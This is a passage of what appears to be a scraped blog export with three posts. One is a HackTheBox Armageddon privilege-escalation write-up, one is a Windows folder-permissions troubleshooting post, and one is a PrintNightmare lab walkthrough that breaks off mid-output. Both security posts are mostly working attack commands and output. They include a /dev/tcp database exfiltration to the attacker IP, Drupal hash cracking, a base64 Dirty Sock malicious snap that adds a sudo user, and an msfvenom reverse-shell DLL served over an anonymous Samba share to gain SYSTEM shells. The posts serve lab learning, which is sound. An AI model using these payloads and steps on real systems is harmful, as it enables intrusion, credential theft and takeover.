pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Traceback (most recent call last): File \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; File \u0026#34;/usr/lib64/python3.6/pty.py\u0026#34;, line 154, in spawn pid, master_fd = fork() File \u0026#34;/usr/lib64/python3.6/pty.py\u0026#34;, line 96, in fork master_fd, slave_fd = openpty() File \u0026#34;/usr/lib64/python3.6/pty.py\u0026#34;, line 29, in openpty master_fd, slave_name = _open_terminal() File \u0026#34;/usr/lib64/python3.6/pty.py\u0026#34;, line 59, in _open_terminal raise OSError(\u0026#39;out of pty devices\u0026#39;) OSError: out of pty devices Privilege Escalation Shell as brucetherealadmin Enumeration There is only one user other than root who has a login shell.\nbash-4.2$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash Running a recursive grep to find passwords under the web root directory pops one password out from settings.php.\nbash-4.2$ pwd /var/www/html bash-4.2$ grep -Ri \u0026#34;password\u0026#34; 2\u0026gt;/dev/null ...[SNIP]... sites/default/settings.php: \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;CQHEy@9M*m23gBVj\u0026#39;, ...[SNIP]... Looking at the contents of settings.php reveals a database credential.\nbash-4.2$ cat sites/default/settings.php $databases = array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;database\u0026#39; =\u0026gt; \u0026#39;drupal\u0026#39;, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;drupaluser\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;CQHEy@9M*m23gBVj\u0026#39;, \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;port\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;driver\u0026#39; =\u0026gt; \u0026#39;mysql\u0026#39;, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ), ), ); MySQL Access The password didn\u0026rsquo;t work for user brucetherealadmin, but it did work for the database (of course). Unfortunately, because I\u0026rsquo;m not in a TTY, I couldn\u0026rsquo;t get into MySQL interactive shell, so instead, I dump the database using mysqldump and exfil the output to my attacking machine.\nbash-4.2$ mysqldump -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal \u0026gt; drupal.dump; cat drupal.dump \u0026gt; /dev/tcp/10.10.14.4/88 On my Kali.\n→ kali@kali «loot» «10.10.14.4» $ nc -nvlp 88 \u0026gt; drupal.dump listening on [any] 88 ... connect to [10.10.14.4] from (UNKNOWN) [10.129.90.96] 58444 Examination of the dumped data reveals the structure of users table.\n...[SNIP]...DROPTABLEIFEXISTS`users`;/*!40101 SET @saved_cs_client = @@character_set_client */;/*!40101 SET character_set_client = utf8 */;CREATETABLE`users`(`uid`int(10)unsignedNOTNULLDEFAULT\u0026#39;0\u0026#39;COMMENT\u0026#39;Primary Key: Unique user ID.\u0026#39;,`name`varchar(60)NOTNULLDEFAULT\u0026#39;\u0026#39;COMMENT\u0026#39;Unique user name.\u0026#39;,`pass`varchar(128)NOTNULLDEFAULT\u0026#39;\u0026#39;COMMENT\u0026#39;User’s password (hashed).\u0026#39;,...[SNIP]...Knowing the users table structure, I could use the MySQL -e option to retrieve the contents of column name and column pass from the users table. This returns a password hash of brucetherealadmin, and I will have to crack this.\nbash-4.2$ mysql -h localhost -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; drupal -e \u0026#39;select name, pass from users\u0026#39; name pass brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt Password Crack The password has been recovered back to plain text using hashcat and rockyou.txt.\nC:\\tools\\hashcat6\u0026gt; hashcat.exe -m 7900 \u0026quot;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt\u0026quot; rockyou.txt ...[SNIP]... $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo Session..........: hashcat Status...........: Cracked Hash.Name........: Drupal7 Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt Time.Started.....: Tue Mar 30 12:03:57 2021 (3 secs) Time.Estimated...: Tue Mar 30 12:04:00 2021 (0 secs) ...[SNIP]... SSH - brucetherealadmin The password booboo works for brucetherealadmin and can be used on SSH.\n→ kali@kali «loot» «10.10.14.4» $ ssh brucetherealadmin@10.129.90.96 brucetherealadmin@10.10.10.233\u0026#39;s password: Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2 [brucetherealadmin@armageddon ~]$ id uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 User flag is done here.\nShell as root Enumeration User brucetherealadmin is allowed to run /usr/bin/snap install as root user. I could leverage this rights to install a malicious snap package.\n[brucetherealadmin@armageddon ~]$ sudo -l Matching Defaults entries for brucetherealadmin on armageddon: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User brucetherealadmin may run the following commands on armageddon: (root) NOPASSWD: /usr/bin/snap install * Malicious Snap Package After googling around, I found this blog by Chris Moberly about Dirty Sock vulnerability in Snap version \u0026lt; 2.37. The author created two PoC exploits for this vulnerability:\n  dirty_sockv1: Uses the ‘create-user’ API to create a local user based on details queried from the Ubuntu SSO.\n  dirty_sockv2: Sideloads a snap that contains an install-hook that generates a new local user.\n  The current snap version is not vulnerable (patched with regex) to Dirty Sock. But, since the goal here is to install a malicious snap package with administrative privilege, I can steal the payload (trojan snap code) from the PoC exploit v2 and revert it back to a snap package.\n[brucetherealadmin@armageddon shm]$ snap version snap 2.47.1-1.el7 snapd 2.47.1-1.el7 series 16 centos 7 kernel 3.10.0-1160.6.1.el7.x86_64 First, I will grab the v2 exploit and transfer it to Armageddon\n→ kali@kali «exploit» «10.10.14.4» $ wget https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py → kali@kali «exploit» «10.10.14.4» $ scp dirty_sockv2.py brucetherealadmin@10.129.92.110:/dev/shm brucetherealadmin@10.129.92.110\u0026#39;s password: dirty_sockv2.py 100% 8696 8.5KB/s 00:01 I will pull out the payload from the exploit and revert it back to a snap package.\n[brucetherealadmin@armageddon shm]$ python3 -c \u0026#34;print(\u0026#39;\u0026#39;\u0026#39; \u0026gt; aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/ \u0026gt; /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh \u0026gt; ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5 \u0026gt; TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo \u0026gt; T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl \u0026gt; Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt \u0026gt; ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv \u0026gt; ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n \u0026gt; L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt \u0026gt; b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe \u0026gt; rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj \u0026gt; rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA \u0026gt; AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2 \u0026gt; XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5 \u0026gt; RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA \u0026gt; AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\u0026#39;\u0026#39;\u0026#39;+ \u0026#39;A\u0026#39; * 4256 + \u0026#39;==\u0026#39;)\u0026#34; | base64 -d \u0026gt; malicious.snap [brucetherealadmin@armageddon shm]$ file malicious.snap file malicious.snap malicious.snap: Squashfs filesystem, little endian, version 4.0, 910 bytes, 7 inodes, blocksize: 131072 bytes, created: Sat Feb 2 23:00:32 2019 Install Malicious Package The malicious.snap file now can be installed with --devmode option to skip digital signatures check. If the exploit success, there will be a new user added called dirty_sock (default from the payload).\n[brucetherealadmin@armageddon shm]$ sudo /usr/bin/snap install --devmode malicious.snap dirty-sock 0.1 installed And the user is there.\n[brucetherealadmin@armageddon shm]$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash su - root Now I can switch user to dirty_sock using a password of dirty_sock and run sudo su to obtain a root shell.\n[brucetherealadmin@armageddon shm]$ su dirty_sock Password: [dirty_sock@armageddon shm]$ sudo su We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. [sudo] password for dirty_sock: [root@armageddon shm]# ifconfig ens192: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.129.92.110 netmask 255.255.0.0 broadcast 10.129.255.255 inet6 fe80::7edc:a185:87bc:5935 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; inet6 fe80::7648:5ea1:5371:b3b5 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; inet6 fe80::ef75:a96e:3c27:e78b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 00:50:56:b9:41:c7 txqueuelen 1000 (Ethernet) RX packets 9191 bytes 732392 (715.2 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1149 bytes 188885 (184.4 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0  Reference(s)  https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-armageddon/","summary":"Armageddon is an easy Linux machine from HackTheBox that features an instance of Drupal 7 CMS. Enumeration of the CMS reveals that it is vulnerable to a remote code execution. With help of Metasploit module, I\u0026rsquo;m able to compromise the web server. Examining the Drupal configuration files discovers a set of database credentials, which can be used to login and dump the user credentials from MySQL database. The user is allowed to install a snap package as root user, and this could be leveraged to obtain root shell.","tags":["Linux","Drupal7","Metasploit","Dirty-sock","sudo"],"title":"HackTheBox - Armageddon"},{"content":"Yesterday, I wanted to upgrade my Microsoft Office, and then planned to clean up my Windows laptop from unused programs, particularly the ones installed by chocolatey (Windows package manager). But, you guess it, things don\u0026rsquo;t always go as planned.\nThe first problem I encounter was Error Code: 30015-4 (5), while trying to re-install my Microsoft Office, and then several C:\\ProgramData\\Microsoft\\Windows GetLastError:5 error messages. These problems were related to Windows permissions, and I believe they were caused by a Microsoft troubleshooter tool called SaRA. The tool might have accidentally messed up the Windows permissions during the process of cleaning up my previous Microsoft Office. As a result, my Windows no longer be able to install or remove some apps.\nBut, I was able to resolve these problems by manually resetting the permissions of the respective app folders back to their original state. So, I think it would be fun to post how I resolve them.\nThe Problems The first problem I ran into was Error Code: 30015-4(5) when I tried to reinstall my Microsoft Office.\nI clicked on the online help, and it was pointing out to this page. At the bottom of the page, it offers an \u0026ldquo;easy fix\u0026rdquo; tool to resolve the problem above.\nI downloaded and ran that tool, but the error remains 🙃.\nAt this point, I couldn\u0026rsquo;t install or uninstall any applications wrapped with Windows Installer (.msi) anymore, including NodeJS. It\u0026rsquo;s the same problem as the one in my PrintNightmare post, in which my Visual Studio refuses to install the Windows SDK.\nAnd somehow, this also affects my laptop\u0026rsquo;s WiFi functionality/features, such as:\n Unable to save WiFi profiles, auto-connect no longer works. Unable to turn on the mobile hotspot feature The \u0026ldquo;Forget\u0026rdquo; and \u0026ldquo;Properties\u0026rdquo; options are missing when a right-click is performed on a WiFi connection.  The most weird one is a stack-based buffer error came from my WiFi settings.\nThe error raises when I clicked any Wi-Fi connection that currently in use from the Wi-Fi settings.\nAlso, the \u0026ldquo;Forget\u0026rdquo; and \u0026ldquo;Properties\u0026rdquo; options were missing. I found the same issue here but the solution doesn\u0026rsquo;t suite my environment.\nFinding The Root Cause Searching for Error Code: 30015-4 (5) on the Microsoft Support site didn\u0026rsquo;t really help, so I started to search for the official documentation about error code, and I found this page. I couldn\u0026rsquo;t find anything about \u0026ldquo;30015-4\u0026rdquo; in that page, but I think I did know what \u0026ldquo;(5)\u0026rdquo; meant.\nAt this point, it was clear that these problems were related to the system permissions (even my Wi-Fi problem).\nI started to investigate C:\\Program Files\\ and C:\\Program Files (x86)\\ (the default folder for installed apps), but no problems were found there. So the next one is C:\\ProgramData, where all application data is stored/created.\nWhile investigating all the folders under C:\\ProgramData\\ and C:\\ProgramData\\Microsoft, I noticed that some of the folders only have my account listed in their security properties.\nNormally, the folder permissions under C:\\ProgramData should be configured similar to the image below (taken from VirtualBox folder) .\nAnd here are the advanced permission settings.\nNow I know how the default permissions look like, and I can use this as a template to fix the other folders with bad permissions.\nFix The Problems Office Error Code: 30015-4 (5) This error Error Code: 30015-4 (5) can be resolved by enabling the inheritance on the respective app folder, which is C:\\ProgramData\\Microsoft\\OFFICE. So that the permissions of the Microsoft folder will be inherited to the OFFICE folder. I will also remove my account, \u0026ldquo;Fahmi FJ\u0026rdquo;, from the permission entries.\nIf you\u0026rsquo;re not sure about this, do check the other folders' permission under the same parent folder. Using this case, then the parent folder is C:\\ProgramData\\Microsoft\\, and the child is other folders under C:\\ProgramData\\Microsoft\\[child].\nI got my Ms Office back now.\nGetLastError:5 Any GetLastError:5, can be resolved using the same method as above, by enabling the inheritance to of the affected application folder.\nIn my case, I got the following error message from chocolatey and node.js:\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs GetLastError: 5 Then, first, I should look into the permissions of Microsoft folder, then Windows folder, and then Start Menu folder, and it turned out the problem is in the Windows folder permissions. So, to resolve this problem, I have to inherit the Microsoft folder permissions to the Windows folder, see image below.\nAnd then, I will revert the Start Menu folder permissions to default, see image below.\nFinally inherit the Start Menu folder permissions to the Programs folder.\nAgain, if you\u0026rsquo;re not sure about this, and didn\u0026rsquo;t want to reinstall your Windows, try install a fresh Windows on Virtual Machine / Cloud and inspect the default permission settings.\nStack-based and WiFi error This section may resolve the following problems.\n SystemSettings.exe - System Error: The system detected an overrun of a blabla.. Windows won\u0026rsquo;t remember Wi-Fi password The \u0026ldquo;Forget\u0026rdquo; and \u0026ldquo;Properties\u0026rdquo; options are missing from Wi-Fi connection. Mobile Hotspot Wi-Fi  In my case the root cause of these problems was also the folder permission.\nIn Windows, all Wi-Fi profiles are stored in C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles, so if the permissions are messed up, the system is most likely to crash or partially working. In my case, my laptop is able to connect to any Wi-Fi network, but it can\u0026rsquo;t remember the Wi-Fi profile, so I have to re-enter my Wi-Fi password every time I want to connect.\nBut, after reverting the Wlansvc folder permissions, the WiFi functionality/features back to normal.\nIt also fixed the missing options and auto-connect.\nAlso, there is no more error about \u0026ldquo;The system detected an overrun of a stack-based buffer in this application. This overrun could potentially allow a malicious user to gain control of this application\u0026rdquo; on the Wi-Fi settings.\n Padahal cuma mau reinstall Office, merembetnya kemana-mana 🙃.\n Conclusion That\u0026rsquo;s all! I hope this post helps you too.\nI will try to keep this post updated whenever I face the same problem related to Windows Permissions.\n References  https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--1700-3999- Myself  ","permalink":"https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/","summary":"Yesterday, I wanted to upgrade my Microsoft Office, and then planned to clean up my Windows laptop from unused programs, particularly the ones installed by chocolatey (Windows package manager). But, you guess it, things don\u0026rsquo;t always go as planned.\nThe first problem I encounter was Error Code: 30015-4 (5), while trying to re-install my Microsoft Office, and then several C:\\ProgramData\\Microsoft\\Windows GetLastError:5 error messages. These problems were related to Windows permissions, and I believe they were caused by a Microsoft troubleshooter tool called SaRA.","tags":["Windows","Troubleshoot"],"title":"Windows 10 Troubleshoot: Permissions"},{"content":"For the past week, a lot of InfoSec pros I follow on Twitter were tweeting about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation, and furthermore, it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to the vulnerability, which is now publicly known as PrintNightmare. This vulnerability was accidentally disclosed by security researchers from China, Zhiniang Peng and Xuefeng Li, after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Print Spooler service. The researchers thought their finding was CVE-2021-1675, but it turned out to be different.\nI’m neither an expert nor an infosec pro, so I won’t dive into any technical thing about the vulnerability. In this post, I just want to play with the vulnerability using HackTheBox retired machines as targets.\n[Updated 03-03-2021]\n Update clarity  Preparation There are several PoC exploits out there for PrintNightmare, but I will use the one that created by Cube0x0. To use the exploit, I will have to change my impacket version to the one that has been modified by Cube0x0. But, changing the currently installed Impacket could potentially mess up my Kali. Therefore, I will use a Python virtual environment using virtualenv module. If I don\u0026rsquo;t have it, I can run the following command to install the module.\n$ python3 -m pip install virtualenv The exploit also requires a DLL for later to be loaded on the target machines. This DLL will be hosted on a Samba server, and it must be configured to allow anonymous access, so that the exploit can directly grab the DLL .\nThat said, I have some preparations to do.\nWorking Directory The first one is a working directory/folder, which I will create one under /opt called printnightmare.\n→ kali@kali «opt» «10.10.14.75» $ mkdir printnightmare \u0026amp;\u0026amp; cd printnightmare Inside the printnightmare , I will clone the cube0x0 impacket as well as the exploit (CVE-2021-1675-cube0x0).\n→ kali@kali «printnightmare» «10.10.14.75» $ git clone https://github.com/cube0x0/impacket \u0026amp;\u0026amp; git clone https://github.com/cube0x0/CVE-2021-1675.git CVE-2021-1675-cube0x0 Next, I will create a virtual environment called impacket-venv using virtualenv.\n→ kali@kali «printnightmare» «10.10.14.75» $ virtualenv impacket-venv created virtual environment CPython3.9.2.final.0-64 in 614ms creator CPython3Posix(dest=/opt/printnightmare/impacket-venv, clear=False, no_vcs_ignore=False, global=False) seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv) added seed packages: pip==21.1.3, setuptools==57.1.0, wheel==0.36.2 activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator Then, I will activate the virtual environment with the following commands.\n→ kali@kali «printnightmare» «10.10.14.75» $ source impacket-venv/bin/activate Now I can just install the cube0x0 impacket.\n(impacket-venv) → kali@kali «printnightmare» «10.10.14.75» $ cd impacket \u0026amp;\u0026amp; python3 setup.py install running install running bdist_egg running egg_info ...[SNIP]... DLL Payload Before generating a DLL, I will create a dll folder first under the printnightmare folder.\n(impacket-venv) → kali@kali «printnightmare» «10.10.14.75» $ mkdir dll I will be using msfvenom to generate the DLL . Upon a successful exploitation, this DLL will connects back to my attacking machine on port 4444, in short, it\u0026rsquo;s a reverse shell.\n(impacket-venv) → kali@kali «dll» «10.10.14.75» $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.75 LPORT=4444 -f dll \u0026gt; revshell.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of dll file: 8704 bytes  If you want to compile your own, go here or see Troubleshoot\n Samba Server Configuration In the exploit repo, cube0x0 also provides a guide on how to configure a Samba server for hosting the DLL payload. I will follow cube0x0\u0026rsquo;s guide, but I will add some additional lines for logging to the configuration file.\nFirst, I will create a backup of the original Samba configuration file.\n(impacket-venv) → kali@kali «printnightmare» «10.10.14.75» $ sudo cp /etc/samba/smb.conf{,.bak} Then I will replace the entire smb.conf contents with the following:\n[global] server role = standalone server smb ports = 445 map to guest = bad user usershare allow guests = yes idmap config * : backend = tdb log file = /var/log/samba/log.%m max log size = 1000 logging = file [ef] comment = Samba path = /opt/printnightmare/dll guest ok = yes read only = no browsable = yes Lastly, I will start the Samba service.\n(impacket-venv) → kali@kali «printnightmare» «10.10.14.75» $ sudo systemctl start smbd Target Machines As stated previously, I will be using HackTheBox retired machines as the targets. Here are the retired Windows machines that I will use along with their low privilege users.\n   Target IP Low Priv Credentials [username:password]     Active 10.10.10.100 svc_tgs:GPPstillStandingStrong2k18   Bastion 10.10.10.134 l4mpje:bureaulampje   Heist 10.10.10.149 hazard:stealth1agent   Forest 10.10.10.161 svc-alfresco:s3rvice   Atom 10.10.10.237 jason:kidvscat_electron_@123     Target Scanning According to this blog post by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:\n Print Spooler Service enabled on the target system ❔ Network connectivity to the target system (initial access has been obtained) ✔ Hash or password for a low privileged user (or computer) account ✔  Now to check if the Print Spooler service enabled, I could follow cube0x0\u0026rsquo;s instruction by using a tool from impacket called rpcdump.py.\n$ rpcdump.py @[IP-ADDRESS] | egrep \u0026#39;MS-RPRN|MS-PAR\u0026#39; rpcclient can also be used to detect the availability of Print Spooler service by invoking enumprinters command. If the returned output is \u0026ldquo;Could not initialise spoolss\u0026rdquo;, then the Print Spooler is most likely to be disabled.\nThe following is a dirty bash script I created to do both using rpcdump.py and rpcclient in one run.\n#!/bin/sh  targets=$1 if [ -z \u0026#34;$targets\u0026#34; ]; then echo \u0026#34;[-] Usage\\t: $0[Target file]\u0026#34; echo \u0026#34;[-] File format : \u0026lt;ip\u0026gt;:\u0026lt;username\u0026gt;:\u0026lt;password\u0026gt; | 127.0.0.1:foo:bar\u0026#34; else for target in `cat $targets`; do ip=$(echo $target | cut -d \u0026#39;:\u0026#39; -f1) username=$(echo $target | cut -d \u0026#39;:\u0026#39; -f2) password=$(echo $target | cut -d \u0026#39;:\u0026#39; -f3) echo \u0026#34; - [$ip] - \u0026#34; impacket-rpcdump $ip | egrep \u0026#39;MS-RPRN|MS-PAR\u0026#39; rpcclient -U \u0026#34;$username%$password\u0026#34; $ip -c \u0026#34;enumprinters;quit\u0026#34; done fi I saved the script as detect-nightmare.sh . I ran the script and it returned the following results.\n→ kali@kali «printnightmare» «10.10.14.75» $ ./detect-nightmare.sh target-machines - [10.10.10.100] - Protocol: [MS-RPRN]: Print System Remote Protocol Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND - [10.10.10.134] - Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol No printers returned. - [10.10.10.149] - Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol No printers returned. - [10.10.10.161] - Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND - [10.10.10.237] - Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol No printers returned. From the results above, Active and Forest don\u0026rsquo;t seem to be vulnerable, but I will still test them out!\nExploitation Demo [10.10.10.100] Active As expected, on Active, the exploit failed.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py active.htb/SVC_TGS:\u0026#39;GPPstillStandingStrong2k18\u0026#39;@10.10.10.100 \u0026#39;\\\\10.10.14.75\\ef\\revshell.dll\u0026#39; [*] Connecting to ncacn_np:10.10.10.100[\\PIPE\\spoolss] [-] Connection Failed [10.10.10.134] Bastion I ran the exploit against Bastion, but the DLL got removed by AV 😂.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py Bastion/l4mpje:\u0026#39;bureaulampje\u0026#39;@10.10.10.134 \u0026#39;\\\\10.10.14.75\\ef\\revshell.dll\u0026#39; [*] Connecting to ncacn_np:10.10.10.134[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_1734185bdb8f8610\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.14.75\\ef\\revshell.dll [*] Try 1... Traceback (most recent call last): ...[SNIP]... impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software No problem! The conclusion here is that Bastion was vulnerable.\n[10.10.10.134] Heist On Heist, the exploit didn\u0026rsquo;t show an indication of a successful exploitation.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py heist/hazard:\u0026#39;stealth1agent\u0026#39;@10.10.10.149 \u0026#39;\\\\10.10.14.75\\ef\\revshell.dll\u0026#39; [*] Connecting to ncacn_np:10.10.10.149[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.14.75\\ef\\revshell.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... Traceback (most recent call last): ...[SNIP]... impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.) But strangely, I got a shell in my listener.\n→ kali@kali «printnightmare» «10.10.14.75» $ nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.75] from (UNKNOWN) [10.10.10.149] 49700 Microsoft Windows [Version 10.0.17763.437] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;hostname hostname SupportDesk C:\\Windows\\system32\u0026gt;ipconfig ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15 IPv4 Address. . . . . . . . . . . : 10.10.10.149 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15 10.10.10.2 [10.10.10.161] Forest Like on Active, the exploit also failed on Forest\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py htb.local/svc-alfresco:\u0026#39;s3rvice\u0026#39;@10.10.10.161 \u0026#39;\\\\10.10.14.75\\ef\\revshell.dll\u0026#39; [*] Connecting to ncacn_np:10.10.10.161[\\PIPE\\spoolss] [-] Connection Failed [10.10.10.237] Atom On Atom, the exploit returned the same result as on Heist, no indication of a successful exploitation.\n(impacket-venv) → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:(main) $ python3 CVE-2021-1675.py ATOM/jason:\u0026#39;kidvscat_electron_@123\u0026#39;@10.10.10.237 \u0026#39;\\\\10.10.14.75\\ef\\revshell.dll\u0026#39; [*] Connecting to ncacn_np:10.10.10.237[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\WINDOWS\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_c62e9f8067f98247\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.14.75\\ef\\revshell.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... Traceback (most recent call last): ...[SNIP]... impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.) But then the DLL connected to my listener.\n→ kali@kali «printnightmare» «10.10.14.75» $ nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.75] from (UNKNOWN) [10.10.10.237] 62322 Microsoft Windows [Version 10.0.19042.906] (c) Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u0026gt;whoami whoami nt authority\\system C:\\WINDOWS\\system32\u0026gt;hostname hostname ATOM C:\\WINDOWS\\system32\u0026gt;ipconfig 